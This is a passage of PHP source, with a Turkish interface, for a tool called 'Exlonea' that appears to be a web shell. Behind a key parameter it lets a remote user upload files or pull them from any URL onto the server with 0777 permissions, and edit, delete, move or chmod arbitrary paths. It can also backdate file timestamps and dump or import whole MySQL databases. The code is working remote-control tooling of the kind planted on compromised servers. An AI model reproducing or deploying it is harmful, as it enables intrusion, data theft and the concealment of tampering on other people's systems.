        } else { header('Content-Type: application/json', true, 500); echo json_encode(['error' => 'Dosya içeriği alınamadı! (Dosya izinlerini kontrol edin: 0644/0777)', 'path' => htmlspecialchars($file)]); }
    } else { header('Content-Type: application/json', true, 404); echo json_encode(['error' => 'Dosya bulunamadı!']); }
    exit;
}
if ($action === 'upload' && isset($_POST['upload_type'])) {
    $uploadDir = $currentDir;
    if (isset($_POST['create_folder_on_upload']) && $_POST['create_folder_on_upload'] === 'yes' && !empty($_POST['upload_folder_name'])) {
        $folderName = $_POST['upload_folder_name'];
        $uploadDir = $currentDir . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($uploadDir)) @mkdir($uploadDir, 0777, true);
    }
    if ($_POST['upload_type'] === 'file') {
        $uploadResult = improvedUploadFile($uploadDir, 'uploaded_files');
        if ($uploadResult['success']) {
            foreach($uploadResult['results'] as $result) {
                if ($result['success']) { $fullUrl = $result['url'] ? '<a href="' . htmlspecialchars($result['url']) . '" target="_blank">Dosyayı Aç</a>' : ''; $success .= 'Yüklendi: ' . htmlspecialchars($result['name']) . ' ' . $fullUrl . '<br>'; }
                else { $error .= 'Yüklenemedi: ' . htmlspecialchars($result['name']) . ' (' . $result['error'] . ')<br>'; }
            }
        } else { $error .= $uploadResult['error'] . '<br>'; }
    } elseif ($_POST['upload_type'] === 'url' && !empty($_POST['urls'])) {
        $urls = explode("\n", $_POST['urls']);
        foreach ($urls as $url) {
            $url = trim($url);
            if (filter_var($url, FILTER_VALIDATE_URL)) {
                $fileName = $uploadDir . DIRECTORY_SEPARATOR . basename(parse_url($url, PHP_URL_PATH));
                $fileName = $fileName ?: $uploadDir . DIRECTORY_SEPARATOR . 'downloaded_file_' . time() . '_' . mt_rand();
                $content = @file_get_contents($url);
                if ($content !== false && file_put_contents($fileName, $content)) {
                    @chmod($fileName, 0777); $fullUrl = getServerFileUrl($fileName); $success .= 'İndirildi: ' . htmlspecialchars($fileName) . ' <a href="' . $fullUrl . '" target="_blank">Dosyayı Aç</a><br>';
                } else { $error .= 'İndirilemedi: ' . $url . '<br>'; }
            } else { $error .= 'Geçersiz URL: ' . $url . '<br>'; }
        }
    } else { $error = 'Dosya veya URL giriniz!'; }
}
if ($action === 'delete' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $deleted = [];
    foreach ($files as $file) {
        $decodedFile = decPath($file);
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
        if(!$filePath) $filePath = realpath($decodedFile);
        if ($filePath && file_exists($filePath)) {
            if (deleteRecursive($filePath)) $deleted[] = htmlspecialchars(basename($decodedFile)); else $error .= 'Silinemedi: ' . htmlspecialchars(basename($decodedFile)) . '<br>';
        } else { $error .= 'Bulunamadı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
    }
    if ($deleted) $success = 'Silindi: ' . htmlspecialchars(implode(', ', $deleted)); else if(!$error) $error = 'Silme hatası!';
}
if ($action === 'rename' && isset($_POST['old_name'], $_POST['new_name'])) {
    $decodedOldName = decPath($_POST['old_name']);
    $oldPath = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedOldName);
    if(!$oldPath) $oldPath = realpath($decodedOldName);
    $basePath = dirname($oldPath);
    $newPath = $basePath . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if ($oldPath && !file_exists($newPath)) {
        $success = @rename($oldPath, $newPath) ? 'Ad değiştirildi: ' . htmlspecialchars($_POST['new_name']) : 'Ad değiştirilemedi!';
        if ($success) @chmod($newPath, 0777);
    } else { $error = 'Adlandırma hatası!'; }
}
if ($action === 'move' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $moved = [];
    $destDirInput = trim($_POST['destination']);
    $destDir = realpath($destDirInput);
    if ($destDir) {
        foreach ($files as $file) {
            $decodedFile = decPath($file);
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
            if(!$filePath) $filePath = realpath($decodedFile);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($decodedFile);
            if ($filePath && !file_exists($dest)) {
                if (@rename($filePath, $dest)) { $moved[] = htmlspecialchars(basename($decodedFile)); @chmod($dest, 0777); } else { $error .= 'Taşınamadı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
            } else { $error .= file_exists($dest) ? 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>' : 'Geçersiz kaynak: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
        }
        $success_link = ($destDir) ? '<a href="?dir=' . encPath($destDir) . "&key=" . $KEY_PARAM . '" class="btn btn-sm btn-info ms-2"><i class="bi bi-folder-check"></i> Dizine Git</a>' : '';
        $success = $moved ? 'Taşındı: ' . htmlspecialchars(implode(', ', $moved)) . $success_link : ($error ? $error : 'Taşıma başarısız!');
    } else { $error = 'Geçersiz hedef dizin: ' . htmlspecialchars($destDirInput) . '!'; }
}
if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $copied = [];
    $destDirInput = trim($_POST['destination']);
    $destDir = realpath($destDirInput);
    if ($destDir) {
        foreach ($files as $file) {
            $decodedFile = decPath($file);
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
            if(!$filePath) $filePath = realpath($decodedFile);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($decodedFile);
            if ($filePath && !file_exists($dest)) {
                if (is_dir($filePath)) { 
                    if(copyDirectory($filePath, $dest)) { $copied[] = htmlspecialchars(basename($decodedFile)); @chmod($dest, 0777); }
                    else { $error .= 'Klasör kopyalanamadı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
                }
                elseif (is_file($filePath)) { if (@copy($filePath, $dest)) { $copied[] = htmlspecialchars(basename($decodedFile)); @chmod($dest, 0777); } else { $error .= 'Kopyalanamadı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; } }
            } else { $error .= file_exists($dest) ? 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>' : 'Geçersiz kaynak: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
        }
        $success_link = ($destDir) ? '<a href="?dir=' . encPath($destDir) . "&key=" . $KEY_PARAM . '" class="btn btn-sm btn-info ms-2"><i class="bi bi-folder-check"></i> Dizine Git</a>' : '';
        $success = $copied ? 'Kopyalandı: ' . htmlspecialchars(implode(', ', $copied)) . $success_link : ($error ? $error : 'Kopyalama başarısız!');
    } else { $error = 'Geçersiz hedef dizin: ' . htmlspecialchars($destDirInput) . '!'; }
}
if ($action === 'unzip' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    foreach ($files as $file) {
        $decodedFile = decPath($file);
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
        if(!$filePath) $filePath = realpath($decodedFile);
        if ($filePath && file_exists($filePath)) {
            $zip = new ZipArchive;
            if ($zip->open($filePath) === TRUE) { $zip->extractTo(dirname($filePath)); $zip->close(); $success .= 'Çıkartıldı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
            else { $error .= 'Çıkartılamadı: ' . htmlspecialchars(basename($decodedFile)) . '<br>'; }
        }
    }
}
if ($action === 'download' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    if (count($files) === 1) {
        $decodedFile = decPath($files[0]);
        $firstFile = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
        if(!$firstFile) $firstFile = realpath($decodedFile);
        if ($firstFile) {
            if (is_file($firstFile)) {
                $filename = basename($firstFile);
                $filesize = filesize($firstFile);
                while (ob_get_level()) ob_end_clean();
                ignore_user_abort(true);
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . $filename . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . $filesize);
                flush();
                $handle = fopen($firstFile, 'rb');
                if ($handle) {
                    while (!feof($handle)) {
                        echo fread($handle, 8192);
                        flush();
                    }
                    fclose($handle);
                }
                exit;
            } else {
                $decodedFiles = array_map('decPath', $files);
                streamZip($decodedFiles, $currentDir);
            }
        } else $error = 'İndirme hatası!';
    } else {
        $decodedFiles = array_map('decPath', $files);
        streamZip($decodedFiles, $currentDir);
    }
}
if (($action === 'directzip' || $action === 'download_zip') && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $decodedFiles = array_map('decPath', $files);
    $zipFileName = $_POST['zip_filename'] ?? ''; 
    if (!empty($decodedFiles)) { if(!streamZip($decodedFiles, $currentDir, $zipFileName)) $error = 'Zipleme hatası!'; } else $error = 'Dosya seçilmedi!';
}
if ($action === 'sunucuyaziple' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $decodedFiles = array_map('decPath', $files);
    $hostname = getHostBaseName();
    $zipName = (count($decodedFiles) === 1) ? basename($decodedFiles[0]) . '.zip' : $hostname . '.zip';
    $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($decodedFiles as $file) {
            $fullPath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            if(!$fullPath) $fullPath = realpath($file);
            if ($fullPath && file_exists($fullPath)) {
                if (is_dir($fullPath)) addFolderToZip($fullPath, $zip, basename($fullPath) . '/');
                elseif (is_file($fullPath)) $zip->addFile($fullPath, basename($fullPath));
            }
        }
        $zip->close(); @chmod($zipPath, 0777); $success = 'Sunucuya ziplendi: ' . htmlspecialchars($zipName);
    } else { $error = 'Zip oluşturulamadı!'; }
}
if ($action === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
    $decodedFile = decPath($_POST['file']);
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
    if(!$file) $file = realpath($decodedFile);
    if ($file && is_file($file)) {
        $content = $_POST['content'];
        $bytesWritten = @file_put_contents($file, $content);
        if ($bytesWritten !== false) { @chmod($file, 0777); $fileUrl = getServerFileUrl($file); $success = 'Kaydedildi: ' . htmlspecialchars(basename($decodedFile)) . ' (' . $bytesWritten . ' bayt) <a href="' . $fileUrl . '" target="_blank">Dosyayı Aç</a>'; }
        else { $error = 'Kaydedilemedi!'; }
    } else { $error = 'Geçersiz dosya!'; }
}
if ($action === 'create_folder' && isset($_POST['folder_name'])) {
    $folderPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['folder_name'];
    if (!file_exists($folderPath)) { if (@mkdir($folderPath, 0777, true)) $success = 'Klasör oluşturuldu: ' . htmlspecialchars($_POST['folder_name']); else $error = 'Klasör oluşturulamadı!'; } else $error = 'Klasör zaten var!';
}
if ($action === 'create_file' && isset($_POST['file_name'])) {
    $fileName = $_POST['file_name'];
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        $handle = @fopen($filePath, 'w');
        if ($handle !== false) {
            fclose($handle);
            @chmod($filePath, 0777);
            header("Location: ?dir=" . encPath($currentDir) . "&key=" . $KEY_PARAM . "&file_to_edit=" . encPath($fileName));
            exit;
        } else { $error = 'Dosya oluşturulamadı! (Yazma izni kontrol edin)'; }
    } else { $error = 'Dosya zaten var!'; }
}
if ($action === 'chmod' && isset($_POST['file']) && isset($_POST['perms'])) {
    $decodedFile = decPath($_POST['file']);
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
    if(!$file) $file = realpath($decodedFile);
    $perms = octdec($_POST['perms']);
    if ($file) { if (@chmod($file, $perms)) $success = 'İzinler güncellendi: ' . htmlspecialchars(basename($decodedFile)) . ' -> ' . $_POST['perms']; else $error = 'İzinler güncellenemedi!'; } else $error = 'Geçersiz dosya!';
}
if ($action === 'touch' && isset($_POST['file']) && isset($_POST['mtime'])) {
    $decodedFile = decPath($_POST['file']);
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $decodedFile);
    if(!$file) $file = realpath($decodedFile);
    $mtime = strtotime($_POST['mtime']);
    if ($file) { if (@touch($file, $mtime)) $success = 'Tarih güncellendi: ' . htmlspecialchars(basename($decodedFile)) . ' -> ' . date('Y-m-d H:i:s', $mtime); else $error = 'Tarih güncellenemedi!'; } else $error = 'Geçersiz dosya!';
}
if ($action === 'database_export' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    try {
        if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");
        $conn = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        if ($conn->connect_error) throw new Exception("Bağlantı hatası: " . $conn->connect_error);
        $filename = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['db']) . '_' . date('Y-m-d_H-i-s') . '.sql';
        while (ob_get_level()) ob_end_clean();
        header('Content-Description: File Transfer'); 
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="' . $filename . '"'); 
        header('Expires: 0'); 
        header('Cache-Control: must-revalidate'); 
        header('Pragma: public');
        flush();
        $tables = array(); $result = $conn->query("SHOW TABLES");
        while ($row = $result->fetch_array()) $tables[] = $row[0];
        foreach ($tables as $table) {
            echo "-- Table: `$table`" . PHP_EOL; echo "DROP TABLE IF EXISTS `$table`;" . PHP_EOL;
            $result = $conn->query("SHOW CREATE TABLE `$table`"); $row = $result->fetch_array(); echo $row[1] . ";" . PHP_EOL . PHP_EOL;
            $result = $conn->query("SELECT * FROM `$table`");
            while ($row = $result->fetch_array(MYSQLI_ASSOC)) {
                $values = array_map(function ($v) use ($conn) { return is_null($v) ? 'NULL' : "'" . $conn->real_escape_string($v) . "'"; }, $row);
                echo "INSERT INTO `$table` VALUES (" . implode(",", $values) . ");" . PHP_EOL;
            }
            echo PHP_EOL . PHP_EOL;
            flush();
        }
        $conn->close();
        exit;
    } catch (Exception $e) { $error = 'Veritabanı Export Hatası: ' . $e->getMessage(); }
}
if ($action === 'database_import' && isset($_FILES['sql_file'])) {
    try {
        if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");
        $conn = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        if ($conn->connect_error) throw new Exception("Bağlantı hatası: " . $conn->connect_error);
        $file = $_FILES['sql_file']['tmp_name'];
        if (is_file($file)) {
            $query = file_get_contents($file);
            if ($conn->multi_query($query)) {
                do { if ($result = $conn->store_result()) $result->free(); } while ($conn->more_results() && $conn->next_result());
                $success = "Veritabanı içe aktarıldı.";
            } else throw new Exception("SQL Hatası: " . $conn->error);
        }
        $conn->close();
    } catch (Exception $e) { $error = 'İçe Aktırma Hatası: ' . $e->getMessage(); }
}
if ($action === 'hash_generate' && isset($_POST['encrypt_input'])) {
    $encrypt_input = $_POST['encrypt_input'];
    $hash = generateBcryptHashPhp($encrypt_input);
    header('Content-Type: application/json');
    echo json_encode(['bcrypt' => $hash]);
    exit;
}
$files = [];
$isSearchMode = ($action === 'search' && !empty($searchTerm));
if ($isSearchContentRecursive) {
    $files = getSearchFilesRecursive($currentDir, $searchTerm, $baseDir);
} elseif ($isSearchMode) {
     $files = getFileList($currentDir);
    $queryLower = strtolower($searchTerm);
    $filteredFiles = [];
    foreach ($files as $file) {
        $nameMatch = stripos($file['name'], $searchTerm) !== false;
        if ($searchType === 'content' && $file['type'] === 'file' && $nameMatch === false) { 
             if (!$isSearchContentRecursive) {
                 $content = @file_get_contents($file['path']);
                 if (stripos($content, $searchTerm) !== false) $nameMatch = true; 
             }
        }
        if ($nameMatch) {
            $filteredFiles[] = $file;
        }
    }
    $files = $filteredFiles;
} elseif ($isRecursiveMode && !$isSearchContentRecursive) {
    $files = getRecentFilesRecursive($currentDir, $timeAgo, $contentFilter, $phpExtensions, $baseDir);
} else {
    $files = getFileList($currentDir);
}
if (!empty($files)) {
    usort($files, function($a, $b) use ($sort, $order, $isRecursiveMode, $isSearchContentRecursive) {
        $typeA = ($a['type'] === 'dir' ? 0 : 1);
        $typeB = ($b['type'] === 'dir' ? 0 : 1);
        if (!$isRecursiveMode && !$isSearchContentRecursive && $typeA !== $typeB) { return $typeA - $typeB; }
        $valA = $a[$sort]; $valB = $b[$sort];
        if ($sort === 'name') $res = strnatcasecmp($valA, $valB);
        else { if ($valA == $valB) $res = 0; else $res = ($valA < $valB) ? -1 : 1; }
        return ($order === 'desc') ? -$res : $res;
    });
}
function getRangeDescription($range, $isCustom, $customDate, $timeAgo) {
    if ($range === 'original') return 'Tüm Zamanlar (Normal Mod)';
    if ($isCustom) return 'Seçilen Tarih: ' . htmlspecialchars($customDate) . ' (Recursive)';
    $ranges = [
        'today' => 'Bugün (Recursive)',
        '1day' => 'Son 1 Gün Öncesi (Recursive)',
        '3days' => 'Son 3 Gün Öncesi (Recursive)',
        '1week' => 'Son 1 Hafta Öncesi (Recursive)',
        '15days' => 'Son 15 Gün Öncesi (Recursive)',
        '1month' => 'Son 1 Ay Öncesi (Recursive)',
        '3months' => 'Son 3 Ay Öncesi (Recursive)',
        '6months' => 'Son 6 Ay Öncesi (Recursive)',
        '1year' => 'Son 1 Yıl Öncesi (Recursive)'
    ];
    $desc = $ranges[$range] ?? 'Tarih Filtreli (Recursive)';
    if ($timeAgo > 0) {
        return $desc . ' | Başlangıç Tarihi: ' . date('d.m.Y - H:i', $timeAgo);
    }
    return $desc;
}
function getContentFilterDescription($filter) {
    return [
        'all' => 'Tüm Dosya Uzantıları', 
        'php_extensions' => 'PHP Uzantıları', 
        'shells' => 'Shelller (Yüksek Riskli Kodlar)', 
        'encrypted' => 'Şifreli Dosyalar (Hassas Kontrol)'
    ][$filter];
}
$hostBaseNameForJs = getHostBaseName();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exlonea</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.10.1/ace.js" type="text/javascript" charset="utf-8"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css" id="highlightTheme">
    <style>
        body { background-color: #f8f9fa; }
        .table { font-size: 14px; }
        .modal-body input, .modal-body textarea { width: 100%; }
        h2 { font-family: 'Cinzel Decorative', cursive; font-weight: 400; }
        .breadcrumb a { text-decoration: none; }
        .footer { color: #6c757d; text-align: center; margin-top: 20px; }
        .file-icon { margin-right: 10px; } 
        .button-group { margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
        .button-group button, .button-group a { min-width: 120px; }
        .table-responsive { 
            overflow-x: auto;
            overflow-y: auto;
            display: block; 
            white-space: nowrap;
            max-height: 400px;
        }
        .file-table-container { 
            width: 100%; 
        }
        .file-table-container table {
            width: 100%;
            table-layout: fixed;
            border-collapse: collapse; 
        }
        .file-table-container th, .file-table-container td {
            padding: 4px 5px; 
            vertical-align: middle;
            text-align: left;
            overflow: hidden; 
            text-overflow: ellipsis; 
            white-space: normal;
            word-break: break-word;
            min-width: 50px; 
            border: 1px solid #dee2e6; 
        }
        .file-table-container th:nth-child(1), .file-table-container td:nth-child(1) { 
             width: 5%;
             min-width: 25px;
             padding-left: 0;
             padding-right: 0;
             text-align: center; 
        }
        .file-table-container th:nth-child(2), .file-table-container td:nth-child(2) { 
             width: 35%; 
             min-width: 150px;
             text-align: left;
             padding-left: 10px;
        }
        .file-table-container th:nth-child(3), .file-table-container td:nth-child(3) { 
             width: 10%; 
             min-width: 60px;
        }
        .file-table-container th:nth-child(4), .file-table-container td:nth-child(4) { 
             width: 18%; 
             min-width: 90px; 
        }
        .file-table-container th:nth-child(5), .file-table-container td:nth-child(5) { 
             width: 18%; 
             min-width: 90px;
        }
        .file-table-container th:nth-child(6), .file-table-container td:nth-child(6) { 
             width: 14%; 
             min-width: 50px; 
        }
        .modal-dialog { max-width: 90%; }
        .table td:first-child, .table th:first-child { text-align: left; }
        .header-icons { position: absolute; top: 10px; right: 10px; display: flex; gap: 10px; }
        .header-icons i { cursor: pointer; font-size: 24px; color: #343a40; }
        .header-icons i:hover { color: #007bff; }
        .self-highlight { color: red !important; font-weight: bold; }
        .btn-custom { 
            background-color: #007bff; 
            border-color: #007bff; 
            color: #ffffff !important; 
            font-weight: normal;
        }
        .btn-custom:hover, .btn-custom:focus, .btn-custom:active { 
            background-color: #0056b3 !important; 
            border-color: #004085 !important; 
            color: #ffffff !important; 
            box-shadow: none; 
        }
        .btn-green { 
            background-color: #28a745; 
            border-color: #28a745; 
            color: #ffffff !important; 
            font-weight: normal; 
        }
        .btn-green:hover, .btn-green:focus, .btn-green:active { 
            background-color: #1e7e34 !important; 
            border-color: #1c7430 !important; 
            color: #ffffff !important; 
            box-shadow: none; 
        }
        .btn-filter-group { 
            background-color: #dc3545; 
            border-color: #dc3545;
            color: #ffffff !important; 
            font-family: Verdana, Geneva, Tahoma, sans-serif; 
            font-weight: normal; 
        }
        .btn-filter-group:hover, .btn-filter-group:focus, .btn-filter-group:active { 
            background-color: #c82333 !important; 
            border-color: #bd2130 !important; 
            color: #ffffff !important; 
        }
        #editor { height: 60vh; border: 1px solid #ccc; border-radius: 4px; width: 100%; }
        .ace_editor { font-size: 14px; }
        .mode-switch { margin-bottom: 15px; }
        .advanced-filters { background: #e9ecef; padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid #ced4da; }
        .advanced-filters-active { border-color: #dc3545; background-color: #ffe6e6; }
        .hash-result { background: #f8f9fa; padding: 10px; border-radius: 5px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
        .hash-result code { word-break: break-all; flex-grow: 1; }
        .hash-result button { margin-left: 10px; flex-shrink: 0; }
        .hash-results-container { max-height: 400px; overflow-y: auto; }
        .db-export-modal .modal-header, .modal-header.bg-primary { background-color: #007bff; color: white; }
        .db-export-modal .modal-title i, .modal-title i { margin-right: 10px; }
        .db-export-modal .modal-footer, .modal-footer { border-top: none; }
        .btn-close-white { filter: invert(1) grayscale(100%) brightness(200%); }
        .server-info-list .info-row { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
        .server-info-list .info-row i { font-size: 1.2rem; color: #007bff; }
        #previewModal img { max-width: 100%; max-height: 80vh; margin: auto; display: block; }
        .dropdown-menu-fit-scroll { max-height: 300px; overflow-y: auto; overflow-x: hidden; }
        .sort-link { text-decoration: none; color: inherit; display: block; width: 100%; }
        .sort-link:hover { color: #0056b3; }
        .modal-header-custom { display: flex; align-items: center; justify-content: space-between; width: 100%; flex-wrap: nowrap; overflow: hidden; }
        .modal-title-custom { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex-grow: 1; margin-right: 10px; }
        .modal-actions-custom { flex-shrink: 0; display: flex; gap: 5px; }
        .edit-fullscreen .modal-dialog { width: 100vw !important; height: 100vh !important; max-width: 100vw !important; margin: 0 !important; }
        .edit-fullscreen .modal-content { height: 100vh !important; border-radius: 0 !important; }
        .edit-fullscreen .modal-body { height: calc(100vh - 130px) !important; padding: 0 !important; }
        .edit-fullscreen #editor { height: 100% !important; border-radius: 0 !important; }
        .edit-fullscreen .modal-footer { position: fixed !important; bottom: 0 !important; left: 0 !important; right: 0 !important; background: #fff !important; z-index: 10 !important; }
        .edit-fullscreen .modal-header { position: sticky !important; top: 0 !important; z-index: 10 !important; background: #fff !important; }
        @media (max-width: 576px) { .modal-title-custom .desktop-filename { display: none; } .modal-title-custom .mobile-filename-info { display: inline-block; } }
        @media (min-width: 577px) { .modal-title-custom .desktop-filename { display: inline; } .modal-title-custom .mobile-filename-info { display: none; } }
        .filename-tooltip { position: fixed; background: #333; color: #fff; padding: 8px 12px; border-radius: 4px; font-size: 12px; max-width: 90vw; word-break: break-all; z-index: 9999; }
        .dropdown-item:hover, .dropdown-item:focus { background-color: #007bff !important; color: white !important; }
        .btn-check:checked + .btn-outline-danger, .btn-check:active + .btn-outline-danger, .btn-outline-danger.active, .btn-outline-danger.dropdown-toggle.show, .btn-outline-danger:active { color: #fff; background-color: #dc3545; border-color: #dc3545; }
        .btn-check:checked + .btn-outline-warning, .btn-check:active + .btn-outline-warning, .btn-outline-warning.active, .btn-outline-warning.dropdown-toggle.show, .btn-outline-warning:active { color: #000; background-color: #ffc107; border-color: #ffc107; }
        .db-table-list { max-height: 600px; overflow-y: auto; border-right: 1px solid #dee2e6; }
        .db-table-item-container:hover .db-table-btn, .db-table-item-container:hover .db-table-btn.text-dark {
            background-color: #3399ff !important;
            color: white !important;
        }
        .db-table-btn {
            background-color: transparent;
            border: none;
            padding: 5px 10px;
            display: block;
            width: 100%;
            text-align: left;
            transition: background-color 0.15s ease-in-out;
            border-radius: 0;
            cursor: pointer;
        }
        .db-table-btn.active {
            background-color: #007bff !important;
            color: white !important;
            font-weight: bold;
        }
        .db-table-btn.active:hover {
            background-color: #0056b3 !important;
            color: white !important;
        }
        .custom-checkbox-style { 
            width: 12px !important; 
            height: 12px !important; 
            min-width: 12px; 
            cursor: pointer; 
            border-radius: 2px; 
            border: 1px solid #6c757d; 
            flex-shrink: 0; 
            margin: 0;
            vertical-align: middle;
        }
        .db-editable-cell input { width: 100%; padding: 2px; box-sizing: border-box; }
        .db-management select option:hover {
            background-color: #3399ff !important;
            color: white !important;
        }
        .db-management select .selected-db-option {
            background-color: #007bff !important; 
            color: white !important;
        }
        .last-path-container {
            background-color: #f0f8ff; 
            border: 1px solid #bce8f1;
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
        }
        .last-path-text {
            word-break: break-all;
            font-size: 12px;
            color: #007bff;
        }
        .db-row-actions button {
            margin: 0 1px;
            padding: 2px 5px;
            font-size: 12px;
        }
        #date_custom_container { margin-left: 10px; display: <?php echo $timeRange === 'custom_date' ? 'block' : 'none'; ?>; }
        .dropdown-toggle.btn-filter-group::after {
            margin-left: .5em;
        }
        @media (max-width: 576px) {
            .table { font-size: 12px; }
            .file-table-container { max-width: 100%; overflow-x: hidden; }
            .file-table-container table { table-layout: fixed; width: 100%; }
            .file-table-container th, .file-table-container td { 
                padding: 4px 3px; 
                font-size: 10px; 
                white-space: normal;
                word-break: break-word;
                line-height: 1.1;
                text-align: center;
                min-width: unset !important;
                max-width: unset !important;
            }
            .file-table-container th:nth-child(1), .file-table-container td:nth-child(1) {
                width: 5%;
                padding-left: 0; 
                padding-right: 0;
                text-align: center;
            }
            .file-table-container th:nth-child(2), .file-table-container td:nth-child(2) {
                 width: 35%; 
                 text-align: left;
            }
            .file-table-container th:nth-child(3), .file-table-container td:nth-child(3) { 
                 width: 10%; 
            }
            .file-table-container th:nth-child(4), .file-table-container td:nth-child(4) { 
                 width: 18%; 
                 font-size: 9px;
            }
            .file-table-container th:nth-child(5), .file-table-container td:nth-child(5) {
                 width: 18%; 
                 font-size: 9px;
            }
            .file-table-container th:nth-child(6), .file-table-container td:nth-child(6) { 
                 width: 14%; 
                 font-size: 10px;
            }
            .file-icon {
                margin-right: 3px;
            }
        }
    </style>
</head>
<body>
    <div class="toast-container position-fixed top-0 end-0 p-3"></div>
    <div class="container mt-4">
        <div class="d-flex justify-content-between align-items-center mb-2">
            <h2><a href="?dir=<?php echo encPath($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>" style="text-decoration:none;color:inherit;">eXlONeA</a></h2>
            <div class="header-icons">
                <i class="bi bi-info-circle-fill" title="Sunucu Bilgileri" onclick="showServerInfo()"></i>
                <i class="bi bi-house-door-fill" title="Ana Dizin" onclick="window.location.href='?dir=<?php echo encPath($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>'"></i>
                <i class="bi bi-box-arrow-right text-danger" title="Çıkış Yap" onclick="window.location.href='?logout=true'"></i>
            </div>
        </div>
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php foreach (getBreadcrumb($currentDir) as $crumb) { 
                    $linkParams = $isRecursiveMode ? "&range=" . urlencode($timeRange) . ($isCustomRange ? '&date_custom=' . urlencode($customDate) : '') . "&content_filter=" . urlencode($contentFilter) : "";
                ?>
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo encPath($crumb['path']); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    </li>
                <?php } ?>
                <i class="bi bi-clipboard breadcrumb-copy-btn ms-2" title="Dizini Kopyala" style="cursor:pointer;color:#007bff;" onclick="copyCurrentPath('<?php echo htmlspecialchars($currentDir); ?>')"></i>
            </ol>
        </nav>
        <?php if ($error): ?>
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="bi bi-info-circle"></i> <?php echo $error; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>
        <?php if ($success): ?>
            <div class="alert alert-success alert-dismissible fade show d-flex align-items-center" role="alert">
                <i class="bi bi-info-circle me-2"></i> <span><?php echo $success; ?></span>
                <button type="button" class="btn-close ms-auto" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>
        <div class="mb-3 button-group">
            <div class="dropdown">
                <button class="btn btn-custom btn-sm dropdown-toggle" type="button" id="actionsMenu" data-bs-toggle="dropdown" aria-expanded="false"><i class="bi bi-list-stars"></i> İşlemler</button>
